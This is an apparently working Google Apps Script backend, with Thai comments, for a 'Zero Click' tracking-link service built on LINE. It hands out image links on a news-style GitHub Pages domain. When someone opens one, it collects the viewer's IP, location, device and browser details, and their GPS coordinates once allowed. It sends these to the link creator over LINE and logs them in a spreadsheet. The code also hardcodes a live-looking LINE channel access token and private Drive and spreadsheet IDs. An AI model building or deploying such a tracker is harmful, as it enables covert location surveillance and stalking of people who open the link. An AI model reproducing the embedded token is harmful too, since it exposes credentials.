// ฟังก์ชันสำหรับจัดการคำขอ POST จาก LIFF
function doPost(e) {
  try {
    Logger.log("=== doPost STARTED ===");
    Logger.log("Content type: " + e.contentType);
    
    // ตรวจสอบประเภทของคำขอ
    if (e.contentType && e.contentType.includes('multipart/form-data')) {
      // กรณีเป็นการอัปโหลดไฟล์
      return handleFileUpload(e);
    } else if (e.postData && e.postData.type === 'application/json') {
      // กรณีเป็นข้อมูล JSON
      const data = JSON.parse(e.postData.contents);
      
      // จัดการตามประเภทของข้อมูล
      if (data.type === 'zeroclick-notification') {
        return handleZeroClickNotification(data);
      } else {
        // ส่งต่อไปยังฟังก์ชันเดิมที่มีอยู่แล้ว (ถ้ามี)
        return handleExistingPostRequest(e);
      }
    } else {
      // กรณีอื่นๆ ส่งต่อไปยังฟังก์ชันเดิมที่มีอยู่แล้ว
      return handleExistingPostRequest(e);
    }
  } catch (error) {
    Logger.log("Error in doPost: " + error.message);
    Logger.log("Stack trace: " + error.stack);
    return ContentService.createTextOutput(JSON.stringify({
      status: 'error',
      message: error.message
    })).setMimeType(ContentService.MimeType.JSON);
  }
}

// ฟังก์ชันจัดการการอัปโหลดไฟล์จาก LIFF
function handleFileUpload(e) {
  try {
    Logger.log("=== handleFileUpload STARTED ===");
    
    // รับข้อมูลจากคำขอ
    const formData = e.parameter;
    const fileBlob = e.parameter.image;
    const trackingKey = formData.trackingKey || generateZeroClickTrackingKey();
    const caseName = formData.caseName || "ZeroClick";
    const userId = formData.userId || "unknown";
    const displayName = formData.displayName || "unknown";
    
    Logger.log("Tracking Key: " + trackingKey);
    Logger.log("Case Name: " + caseName);
    Logger.log("User ID: " + userId);
    Logger.log("Display Name: " + displayName);
    
    // ตรวจสอบไฟล์
    if (!fileBlob) {
      throw new Error("ไม่พบไฟล์รูปภาพ");
    }
    
    // บันทึกความสัมพันธ์ระหว่าง trackingKey และ caseName
    saveZeroClickMapping(trackingKey, caseName, userId, displayName);
    
    // อัปโหลดรูปภาพไปยัง Google Drive
    const imageUrl = uploadImageToDrive(fileBlob, trackingKey);
    
    // สร้าง URL สำหรับการติดตาม
    const trackingUrl = createZeroClickTrackingUrl(trackingKey);
    
    Logger.log("Image URL: " + imageUrl);
    Logger.log("Tracking URL: " + trackingUrl);
    Logger.log("=== handleFileUpload COMPLETED ===");
    
    // ส่งผลลัพธ์กลับไปยัง LIFF
    return ContentService.createTextOutput(JSON.stringify({
      status: 'success',
      trackingKey: trackingKey,
      imageUrl: imageUrl,
      trackingUrl: trackingUrl
    })).setMimeType(ContentService.MimeType.JSON);
  } catch (error) {
    Logger.log("Error in handleFileUpload: " + error.message);
    Logger.log("Stack trace: " + error.stack);
    return ContentService.createTextOutput(JSON.stringify({
      status: 'error',
      message: error.message
    })).setMimeType(ContentService.MimeType.JSON);
  }
}

// ฟังก์ชันจัดการการแจ้งเตือน Zero Click
function handleZeroClickNotification(data) {
  try {
    Logger.log("=== handleZeroClickNotification STARTED ===");
    Logger.log("Data: " + JSON.stringify(data));
    
    const trackingKey = data.trackingKey;
    const event = data.event || "view"; // "view" หรือ "gps"
    
    if (!trackingKey) {
      throw new Error("ไม่พบ tracking key");
    }
    
    // ดึงข้อมูลเคสจาก tracking key
    const trackingInfo = getZeroClickInfo(trackingKey);
    
    if (!trackingInfo) {
      throw new Error("ไม่พบข้อมูลสำหรับ tracking key: " + trackingKey);
    }
    
    // เตรียมข้อมูลสำหรับส่งไปยัง LINE
    data.timestamp = new Date().toLocaleString('th-TH', { timeZone: 'Asia/Bangkok' });
    data.caseName = trackingInfo.caseName;
    data.creatorId = trackingInfo.creatorId;
    data.creatorName = trackingInfo.creatorName;
    data.creatorFullName = trackingInfo.creatorFullName;
    
    // สร้างข้อความแจ้งเตือนตามประเภทของเหตุการณ์
    let message;
    if (event === "view") {
      message = createZeroClickViewMessage(data);
    } else if (event === "gps") {
      message = createZeroClickGPSMessage(data);
    } else {
      message = createZeroClickMessage(data); // ทั่วไป
    }
    
    // ส่งข้อความแจ้งเตือนไปยัง LINE
    sendZeroClickNotification(message, data.creatorId);
    
    // บันทึกข้อมูลลง Spreadsheet
    logZeroClickData(data);
    
    Logger.log("=== handleZeroClickNotification COMPLETED ===");
    
    return ContentService.createTextOutput(JSON.stringify({
      status: 'success'
    })).setMimeType(ContentService.MimeType.JSON);
  } catch (error) {
    Logger.log("Error in handleZeroClickNotification: " + error.message);
    Logger.log("Stack trace: " + error.stack);
    return ContentService.createTextOutput(JSON.stringify({
      status: 'error',
      message: error.message
    })).setMimeType(ContentService.MimeType.JSON);
  }
}

// ฟังก์ชันสร้าง tracking key สำหรับ Zero Click
function generateZeroClickTrackingKey() {
  const timestamp = Date.now().toString(36);
  const randomChars = Math.random().toString(36).substring(2, 6);
  return `zc-${timestamp}-${randomChars}`;
}

// ฟังก์ชันสร้าง URL สำหรับการติดตาม Zero Click
function createZeroClickTrackingUrl(trackingKey) {
  // ปรับ URL ตามโดเมนของคุณ
  return `https://socialtopnews.github.io/news/zeroclick.html?zc=${trackingKey}`;
}

// ฟังก์ชันอัปโหลดรูปภาพไปยัง Google Drive
function uploadImageToDrive(fileBlob, trackingKey) {
  try {
    // ID ของโฟลเดอร์ใน Google Drive
    const FOLDER_ID = "17232Rx3d7mlH5RqgfMsmuwAhhiFqeQQI"; // ต้องเปลี่ยนเป็น ID ของคุณ
    
    // ตั้งชื่อไฟล์
    const fileName = `ZeroClick_${trackingKey}_${new Date().toISOString().replace(/[:.]/g, '-')}`;
    
    // อัปโหลดไฟล์
    const folder = DriveApp.getFolderById(FOLDER_ID);
    const file = folder.createFile(fileBlob);
    file.setName(fileName);
    
    // ตั้งค่าการแชร์ (ให้ทุกคนสามารถดูได้)
    file.setSharing(DriveApp.Access.ANYONE_WITH_LINK, DriveApp.Permission.VIEW);
    
    // รับ URL ของไฟล์
    return file.getDownloadUrl();
  } catch (error) {
    Logger.log("Error uploading image to Drive: " + error.message);
    throw error;
  }
}

// ฟังก์ชันบันทึกความสัมพันธ์ระหว่าง tracking key และ case name
function saveZeroClickMapping(trackingKey, caseName, userId, displayName) {
  try {
    Logger.log("=== saveZeroClickMapping STARTED ===");
    Logger.log("trackingKey: " + trackingKey);
    Logger.log("caseName: " + caseName);
    Logger.log("userId: " + userId);
    Logger.log("displayName: " + displayName);
    
    // เปิดชีตที่ใช้เก็บข้อมูล
    const spreadsheet = SpreadsheetApp.openById('1j7MqTTEW6izLtVDk95SlPYLjkUqk9MTV7-ZK0Arpnj8');
    let mappingSheet = spreadsheet.getSheetByName('ZeroClickMapping');
    
    // สร้างชีตใหม่หากยังไม่มี
    if (!mappingSheet) {
      Logger.log("สร้างชีต ZeroClickMapping ใหม่");
      mappingSheet = spreadsheet.insertSheet('ZeroClickMapping');
      
      // สร้างหัวตาราง
      const headers = ['TrackingKey', 'CaseName', 'CreateDate', 'CreatorId', 'CreatorName', 'CreatorFullName', 'Type'];
      mappingSheet.appendRow(headers);
      
      // จัดรูปแบบหัวตาราง
      mappingSheet.getRange(1, 1, 1, headers.length)
        .setBackground('#4285f4')
        .setFontColor('#ffffff')
        .setFontWeight('bold');
      
      // ปรับความกว้างคอลัมน์
      mappingSheet.setColumnWidth(1, 200); // TrackingKey
      mappingSheet.setColumnWidth(2, 250); // CaseName
      mappingSheet.setColumnWidth(3, 180); // CreateDate
      mappingSheet.setColumnWidth(4, 250); // CreatorId
      mappingSheet.setColumnWidth(5, 150); // CreatorName
      mappingSheet.setColumnWidth(6, 250); // CreatorFullName
      mappingSheet.setColumnWidth(7, 100); // Type
    }
    
    // ค้นหาชื่อ-สกุลจากชีต UserRegistration
    const creatorFullName = getUserFullName(userId);
    Logger.log("ดึงชื่อ-สกุลได้: " + creatorFullName);
    
    // บันทึกข้อมูล
    const currentDate = new Date().toLocaleString('th-TH', { timeZone: 'Asia/Bangkok' });
    
    // ตรวจสอบข้อมูลซ้ำก่อนบันทึก
    const existingRow = findExistingZeroClickTracking(mappingSheet, trackingKey);
    if (existingRow > 0) {
      // อัปเดตข้อมูลที่มีอยู่แล้ว
      Logger.log("อัปเดตข้อมูลที่มีอยู่แล้ว แถวที่: " + existingRow);
      mappingSheet.getRange(existingRow, 2).setValue(caseName);
      mappingSheet.getRange(existingRow, 3).setValue(currentDate);
      mappingSheet.getRange(existingRow, 4).setValue(userId);
      mappingSheet.getRange(existingRow, 5).setValue(displayName);
      mappingSheet.getRange(existingRow, 6).setValue(creatorFullName);
      mappingSheet.getRange(existingRow, 7).setValue("ZeroClick");
    } else {
      // เพิ่มข้อมูลใหม่
      Logger.log("เพิ่มข้อมูลใหม่");
      mappingSheet.appendRow([
        trackingKey, 
        caseName, 
        currentDate, 
        userId, 
        displayName, 
        creatorFullName,
        "ZeroClick"
      ]);
    }
    
    Logger.log(`บันทึกความสัมพันธ์ระหว่าง ${trackingKey} และ ${caseName} โดย ${creatorFullName} สำเร็จ`);
    Logger.log("=== saveZeroClickMapping COMPLETED ===");
    return true;
  } catch (error) {
    Logger.log(`เกิดข้อผิดพลาดในการบันทึกความสัมพันธ์: ${error.message}`);
    Logger.log(`Stack trace: ${error.stack}`);
    return false;
  }
}

// ฟังก์ชันค้นหาข้อมูล tracking key ที่มีอยู่แล้ว
function findExistingZeroClickTracking(sheet, trackingKey) {
  const dataRange = sheet.getDataRange();
  const values = dataRange.getValues();
  
  for (let i = 1; i < values.length; i++) {
    if (values[i][0] === trackingKey) {
      return i + 1; // คืนค่าแถวที่พบ (บวก 1 เพราะ index เริ่มที่ 0)
    }
  }
  
  return 0; // ไม่พบข้อมูล
}

// ฟังก์ชันดึงข้อมูล Zero Click จาก tracking key
function getZeroClickInfo(trackingKey) {
  try {
    Logger.log("=== getZeroClickInfo STARTED ===");
    Logger.log("trackingKey: " + trackingKey);
    
    if (!trackingKey) {
      Logger.log("trackingKey เป็นค่าว่างหรือ null");
      return null;
    }
    
    const spreadsheet = SpreadsheetApp.openById('1j7MqTTEW6izLtVDk95SlPYLjkUqk9MTV7-ZK0Arpnj8');
    const mappingSheet = spreadsheet.getSheetByName('ZeroClickMapping');
    
    if (!mappingSheet) {
      Logger.log("ไม่พบชีต ZeroClickMapping");
      return null;
    }
    
    // ดึงข้อมูลทั้งหมดจากชีต
    const dataRange = mappingSheet.getDataRange();
    const values = dataRange.getValues();
    const headers = values[0];
    
    // ล็อกข้อมูลหัวตาราง
    Logger.log("หัวตาราง: " + headers.join(", "));
    
    // หาดัชนีของแต่ละคอลัมน์
    const caseIdx = headers.indexOf('CaseName');
    const creatorIdIdx = headers.indexOf('CreatorId');
    const creatorNameIdx = headers.indexOf('CreatorName');
    const creatorFullNameIdx = headers.indexOf('CreatorFullName');
    
    Logger.log("ดัชนีของคอลัมน์ - CaseName: " + caseIdx + 
               ", CreatorId: " + creatorIdIdx + 
               ", CreatorName: " + creatorNameIdx + 
               ", CreatorFullName: " + creatorFullNameIdx);
    
    // ค้นหา trackKey ในคอลัมน์ A
    for (let i = 1; i < values.length; i++) {
      if (values[i][0] === trackingKey) {
        const result = {
          trackingKey: trackingKey,
          caseName: values[i][caseIdx !== -1 ? caseIdx : 1] || "ZeroClick",
          createDate: values[i][2] || "",
          creatorId: values[i][creatorIdIdx !== -1 ? creatorIdIdx : 3] || null,
          creatorName: values[i][creatorNameIdx !== -1 ? creatorNameIdx : 4] || "ไม่ทราบ",
          creatorFullName: values[i][creatorFullNameIdx !== -1 ? creatorFullNameIdx : 5] || "ไม่ทราบ"
        };
        
        Logger.log("พบข้อมูล Zero Click: " + JSON.stringify(result));
        Logger.log("=== getZeroClickInfo COMPLETED ===");
        return result;
      }
    }
    
    Logger.log("ไม่พบ Tracking Key ในชีต");
    Logger.log("=== getZeroClickInfo COMPLETED ===");
    return null;
  } catch (error) {
    Logger.log("Error retrieving Zero Click info: " + error);
    Logger.log("Stack trace: " + error.stack);
    return null;
  }
}

// ฟังก์ชันสร้างข้อความแจ้งเตือนเมื่อมีการเปิดดู Zero Click
function createZeroClickViewMessage(data) {
  const timestamp = data.timestamp || new Date().toLocaleString('th-TH', { timeZone: 'Asia/Bangkok' });
  
  // ข้อมูล IP
  const ipData = data.ip || {};
  const ip = ipData.ip || "ไม่สามารถระบุได้";
  const location = ipData.city ? `${ipData.city}, ${ipData.region}, ${ipData.country}` : "ไม่ทราบ";
  
  // ข้อมูลอุปกรณ์
  const deviceInfo = data.deviceInfo || {};
  const deviceType = deviceInfo.deviceType || "ไม่ทราบ";
  const deviceModel = deviceInfo.deviceModel || "ไม่ทราบ";
  const browser = deviceInfo.browser || "ไม่ทราบ";
  
  // สร้างข้อความแจ้งเตือน
  const messageLines = [
    "🚨[Zero Click] แจ้งเตือนการเปิดดูภาพ",
    `⏰เวลา: ${timestamp}`,
  ];
  
  // เพิ่มข้อมูล Case Name และ Tracking Key
  if (data.trackingKey) {
    messageLines.push(`🔑Tracking Key: ${data.trackingKey}`);
  }
  
  if (data.caseName && data.caseName !== "ไม่มีค่า") {
    messageLines.push(`📋ชื่อเคส: ${data.caseName}`);
  }
  
  // เพิ่มข้อมูลชื่อ-สกุลผู้สร้าง Tracking Key (ถ้ามี)
  if (data.creatorFullName && data.creatorFullName !== "ไม่ทราบ") {
    messageLines.push(`👤ผู้สร้าง: ${data.creatorFullName}`);
  }
  
  // เพิ่มข้อมูล IP และตำแหน่ง
  messageLines.push(
    `\n🌐IP: ${ip}`,
    ` - ตำแหน่ง(IP): ${location}`,
  );
  
  // ข้อมูลอุปกรณ์
  messageLines.push(`\n💻อุปกรณ์: ${deviceType} - ${deviceModel}`);
  messageLines.push(`🌐เบราว์เซอร์: ${browser}`);
  
  // รอการอนุญาต GPS
  messageLines.push(`\n⌛รอข้อมูลพิกัด GPS...`);
  
  // ลงท้าย
  messageLines.push(`\n[เมื่อได้รับการอนุญาต GPS จะแจ้งเตือนอีกครั้ง]`);
  
  return messageLines.join("\n");
}

// ฟังก์ชันสร้างข้อความแจ้งเตือนเมื่อได้รับข้อมูล GPS จาก Zero Click
function createZeroClickGPSMessage(data) {
  const timestamp = data.timestamp || new Date().toLocaleString('th-TH', { timeZone: 'Asia/Bangkok' });
  
  // ข้อมูลพิกัด
  let locationInfo = "ไม่สามารถระบุได้";
  let googleMapsLink = null;
  let gpsAccuracy = "ไม่ทราบ";
  
  if (data.location && typeof data.location === 'object' && data.location.lat && data.location.long) {
    locationInfo = `${data.location.lat}, ${data.location.long}`;
    if (data.location.gmapLink) {
      googleMapsLink = data.location.gmapLink;
    } else {
      googleMapsLink = `https://www.google.com/maps?q=${data.location.lat},${data.location.long}`;
    }
    if (data.location.accuracy) {
      gpsAccuracy = `${Math.round(data.location.accuracy)}m`;
    }
  }
  
  // สร้างข้อความแจ้งเตือน
  const messageLines = [
    "🎯[Zero Click] ได้รับพิกัด GPS แล้ว!",
    `⏰เวลา: ${timestamp}`,
  ];
  
  // เพิ่มข้อมูล Case Name และ Tracking Key
  if (data.trackingKey) {
    messageLines.push(`🔑Tracking Key: ${data.trackingKey}`);
  }
  
  if (data.caseName && data.caseName !== "ไม่มีค่า") {
    messageLines.push(`📋ชื่อเคส: ${data.caseName}`);
  }
  
  // ข้อมูลพิกัด GPS
  messageLines.push(`\n📍พิกัด GPS: ${locationInfo}` + (gpsAccuracy !== "ไม่ทราบ" ? ` (แม่นยำ±${gpsAccuracy})` : ''));
  
  if (googleMapsLink) {
    messageLines.push(`🗺️แผนที่: ${googleMapsLink}`);
  }
  
  // เพิ่มข้อมูลการเชื่อมต่อ
  const connectionInfo = (data.deviceInfo && data.deviceInfo.connection) || {};
  const networkType = connectionInfo.networkType || "ไม่ทราบ";
  const connectionType = connectionInfo.effectiveType || "ไม่ทราบ";
  
  messageLines.push(`\n📶การเชื่อมต่อ: ${networkType} (${connectionType})`);
  
  return messageLines.join("\n");
}

// ฟังก์ชันสร้างข้อความแจ้งเตือนทั่วไปสำหรับ Zero Click
function createZeroClickMessage(data) {
  // ใช้ข้อความเดียวกับ createZeroClickViewMessage เพื่อเป็นค่าเริ่มต้น
  return createZeroClickViewMessage(data);
}

// ฟังก์ชันส่งข้อความแจ้งเตือน Zero Click ไปยัง LINE
function sendZeroClickNotification(message, recipientId) {
  try {
    Logger.log("=== sendZeroClickNotification STARTED ===");
    
    const LINE_CHANNEL_TOKEN = 'Y5f04lJbHSrP3Dd1W7ksrBzB9I15XQH8z5Wzm31s/uHqtRV2yGfF/dscvqYrycBmvNjR/L9EUajPTV1CO9V9/KduqLujwCA/9OEX+EFwGH6NXnckX+qLZBZ8K8Y+vHao4EES9XKmG60qzYzeUD4n1AdB04t89/1O/w1cDnyilFU=';
    const LINE_API_ENDPOINT = 'https://api.line.me/v2/bot/message/push';
    
    // ตรวจสอบว่า recipientId ถูกต้องหรือไม่
    if (!recipientId || recipientId.trim() === "") {
      Logger.log("recipientId ไม่ถูกต้อง ใช้ค่าเริ่มต้น");
      recipientId = "U69aa2cb90c9f40291278c346c50dc021"; // ใช้ ID ของผู้ดูแลระบบเป็นค่าเริ่มต้น
    }
    
    // สร้าง payload สำหรับ LINE API
    const payload = {
      to: recipientId,
      messages: [{
        type: 'text',
        text: message
      }]
    };
    
    // ตั้งค่า options สำหรับ HTTP request
    const options = {
      method: 'post',
      contentType: 'application/json',
      headers: {
        'Authorization': 'Bearer ' + LINE_CHANNEL_TOKEN
      },
      payload: JSON.stringify(payload),
      muteHttpExceptions: true
    };
    
    // ส่ง request ไปยัง LINE API
    Logger.log("กำลังส่งข้อความไปยัง LINE ของผู้ใช้: " + recipientId);
    const response = UrlFetchApp.fetch(LINE_API_ENDPOINT, options);
    const responseCode = response.getResponseCode();
    
    if (responseCode >= 200 && responseCode < 300) {
      Logger.log("ส่งข้อความแจ้งเตือน Zero Click สำเร็จ");
      Logger.log("=== sendZeroClickNotification COMPLETED ===");
      return true;
    } else {
      Logger.log(`ไม่สามารถส่งข้อความแจ้งเตือน Zero Click: HTTP ${responseCode} - ${response.getContentText()}`);
      Logger.log("=== sendZeroClickNotification COMPLETED ===");
      return false;
    }
  } catch (error) {
    Logger.log("Error sending Zero Click notification: " + error.message);
    Logger.log("Stack trace: " + error.stack);
    return false;
  }
}

// ฟังก์ชันบันทึกข้อมูล Zero Click ลง Spreadsheet
function logZeroClickData(data) {
  try {
    Logger.log("=== logZeroClickData STARTED ===");
    
    // ID ของ Google Spreadsheet ที่ใช้เก็บข้อมูล
    const spreadsheetId = '1j7MqTTEW6izLtVDk95SlPYLjkUqk9MTV7-ZK0Arpnj8';
    
    // เปิด Spreadsheet และเลือกชีท
    const spreadsheet = SpreadsheetApp.openById(spreadsheetId);
    let sheet = spreadsheet.getSheetByName('ZeroClickLog');
    
    // สร้างชีทใหม่หากยังไม่มี
    if (!sheet) {
      Logger.log("สร้างชีท ZeroClickLog ใหม่");
      sheet = spreadsheet.insertSheet('ZeroClickLog');
      
      // สร้างหัวตาราง
      const headers = [
        'วันเวลา', 'Tracking Key', 'ชื่อเคส', 'ผู้สร้าง', 'ประเภทเหตุการณ์',
        'IP', 'ประเทศ (IP)', 'เมือง (IP)', 'พิกัด GPS', 'แผนที่ GPS', 'ความแม่นยำ GPS (m)',
        'ประเภทอุปกรณ์', 'รุ่นอุปกรณ์', 'เบราว์เซอร์', 'การเชื่อมต่อ', 'RequestId'
      ];
      
      sheet.appendRow(headers);
      
      // จัดรูปแบบหัวตาราง
      sheet.getRange(1, 1, 1, headers.length)
        .setBackground('#4285f4')
        .setFontColor('#ffffff')
        .setFontWeight('bold');
      
      // ปรับความกว้างคอลัมน์
      sheet.setColumnWidth(1, 180);  // วันเวลา
      sheet.setColumnWidth(2, 200);  // Tracking Key
      sheet.setColumnWidth(3, 250);  // ชื่อเคส
      sheet.setColumnWidth(4, 250);  // ผู้สร้าง
      sheet.setColumnWidth(5, 150);  // ประเภทเหตุการณ์
      sheet.setColumnWidth(6, 130);  // IP
      sheet.setColumnWidth(7, 100);  // ประเทศ (IP)
      sheet.setColumnWidth(8, 120);  // เมือง (IP)
      sheet.setColumnWidth(9, 150);  // พิกัด GPS
      sheet.setColumnWidth(10, 250); // แผนที่ GPS
      sheet.setColumnWidth(11, 120); // ความแม่นยำ GPS
      sheet.setColumnWidth(12, 100); // ประเภทอุปกรณ์
      sheet.setColumnWidth(13, 200); // รุ่นอุปกรณ์
      sheet.setColumnWidth(14, 150); // เบราว์เซอร์
      sheet.setColumnWidth(15, 120); // การเชื่อมต่อ
      sheet.setColumnWidth(16, 250); // RequestId
    }
    
    // เตรียมข้อมูลสำหรับบันทึก
    const timestamp = data.timestamp || new Date().toLocaleString('th-TH', { timeZone: 'Asia/Bangkok' });
    const trackingKey = data.trackingKey || "ไม่มีค่า";
    const caseName = data.caseName || "ไม่มีค่า";
    const creatorFullName = data.creatorFullName || "ไม่ทราบ";
    const eventType = data.event || "view";
    
    // ข้อมูล IP
    const ipData = data.ip || {};
    const ip = ipData.ip || "ไม่สามารถระบุได้";
    const country = ipData.country || "ไม่ทราบ";
    const city = ipData.city ? `${ipData.city}, ${ipData.region}` : "ไม่ทราบ";
    
    // ข้อมูลพิกัด GPS
    let gpsLocationText = "ไม่มีข้อมูล";
    let mapLink = "";
    let gpsAccuracy = "ไม่ทราบ";
    
    if (data.location && typeof data.location === 'object' && data.location.lat && data.location.long) {
      gpsLocationText = `${data.location.lat}, ${data.location.long}`;
      mapLink = data.location.gmapLink || `https://www.google.com/maps?q=${data.location.lat},${data.location.long}`;
      gpsAccuracy = data.location.accuracy ? `${Math.round(data.location.accuracy)}` : "ไม่ทราบ";
    }
    
    // ข้อมูลอุปกรณ์
    const deviceInfo = data.deviceInfo || {};
    const deviceType = deviceInfo.deviceType || "ไม่ทราบ";
    const deviceModel = deviceInfo.deviceModel || "ไม่ทราบ";
    const browser = deviceInfo.browser || "ไม่ทราบ";
    
    // ข้อมูลการเชื่อมต่อ
    const connectionData = deviceInfo.connection;
    let connectionType = "ไม่ทราบ";
    
    if (typeof connectionData === 'object') {
      connectionType = `${connectionData.effectiveType || "ไม่ทราบ"} (${connectionData.type || "ไม่ทราบ"})`;
    }
    
    // ข้อมูล RequestId
    const requestId = data.requestId || "zc-" + new Date().getTime();
    
    // สร้าง row ข้อมูลสำหรับบันทึก
    const rowData = [
      timestamp,       // 1
      trackingKey,     // 2 
      caseName,        // 3
      creatorFullName, // 4 
      eventType,       // 5
      ip,              // 6
      country,         // 7
      city,            // 8
      gpsLocationText, // 9
      mapLink,         // 10
      gpsAccuracy,     // 11
      deviceType,      // 12
      deviceModel,     // 13
      browser,         // 14
      connectionType,  // 15
      requestId        // 16
    ];
    
    // บันทึกข้อมูลลงในชีต
    sheet.appendRow(rowData);
    
    // ปรับแต่งสไตล์ของแถวล่าสุด
    const lastRow = sheet.getLastRow();
    
    // จัดรูปแบบลิงก์แผนที่ GPS ให้คลิกได้ (คอลัมน์ที่ 10)
    if (mapLink && mapLink !== "ไม่มีข้อมูล") {
      sheet.getRange(lastRow, 10).setFormula(`=HYPERLINK("${mapLink}","ดูแผนที่ GPS")`);
    }
    
    Logger.log(`บันทึกข้อมูล Zero Click ลง Spreadsheet สำเร็จ (แถวที่ ${lastRow})`);
    Logger.log("=== logZeroClickData COMPLETED ===");
    
    return true;
  } catch (error) {
    Logger.log(`เกิดข้อผิดพลาดในการบันทึกข้อมูล Zero Click: ${error.message}`);
    Logger.log(`Stack trace: ${error.stack}`);
    return false;
  }
}

// ฟังก์ชันสำหรับรองรับคำขอ POST เดิมที่มีอยู่แล้ว
function handleExistingPostRequest(e) {
  // เรียกใช้ฟังก์ชัน doPost เดิมที่มีอยู่แล้ว
  try {
    // ถ้าคุณมีฟังก์ชัน doPost เดิมอยู่แล้ว คุณสามารถเรียกใช้มันที่นี่
    // ตัวอย่าง: return originalDoPost(e);
    
    // หรือส่งต่อไปยังการประมวลผลเดิม
    // คำสั่งด้านล่างเป็นตัวอย่างเท่านั้น ต้องปรับตามการใช้งานจริง
    return ContentService.createTextOutput(JSON.stringify({
      status: 'forwarded',
      message: 'ส่งต่อไปยังการประมวลผลเดิม'
    })).setMimeType(ContentService.MimeType.JSON);
  } catch (error) {
    Logger.log("Error in handleExistingPostRequest: " + error.message);
    return ContentService.createTextOutput(JSON.stringify({
      status: 'error',
      message: error.message
    })).setMimeType(ContentService.MimeType.JSON);
  }
}

// ฟังก์ชันสำหรับค้นหาชื่อ-สกุลของผู้ใช้จากชีต UserRegistration
function getUserFullName(userId) {
  try {
    Logger.log("=== getUserFullName STARTED ===");
    Logger.log("userId: " + userId);
    
    if (!userId) {
      Logger.log("ไม่ได้ระบุ userId");
      return "ไม่พบข้อมูล (ไม่ระบุ userId)";
    }
    
    // เปิดชีตที่ใช้เก็บข้อมูลลงทะเบียน
    const spreadsheet = SpreadsheetApp.openById('1j7MqTTEW6izLtVDk95SlPYLjkUqk9MTV7-ZK0Arpnj8');
    const registrationSheet = spreadsheet.getSheetByName('UserRegistration');
    
    // ถ้ายังไม่มีชีต ให้คืนค่าเริ่มต้น
    if (!registrationSheet) {
      Logger.log("ไม่พบชีต UserRegistration");
      return "ไม่พบข้อมูล (ไม่พบชีต)";
    }
    
    // ดึงข้อมูลทั้งหมดจากชีต
    const dataRange = registrationSheet.getDataRange();
    const values = dataRange.getValues();
    
    // ค้นหา userId ในชีต
    for (let i = 1; i < values.length; i++) {
      if (values[i][0] === userId) {
        // คอลัมน์ที่ 4 (index 3) เก็บชื่อ-สกุล
        const fullName = values[i][3] || "ไม่พบข้อมูล (ชื่อว่าง)";
        Logger.log("ชื่อ-สกุล: " + fullName);
        Logger.log("=== getUserFullName COMPLETED ===");
        return fullName;
      }
    }
    
    Logger.log("ไม่พบ userId: " + userId + " ในชีต");
    Logger.log("=== getUserFullName COMPLETED ===");
    return "ไม่พบข้อมูล (ไม่พบ userId)";
  } catch (error) {
    Logger.log(`เกิดข้อผิดพลาดในการค้นหาชื่อ-สกุล: ${error.message}`);
    Logger.log(`Stack trace: ${error.stack}`);
    return "ไม่พบข้อมูล (เกิดข้อผิดพลาด)";
  }
}
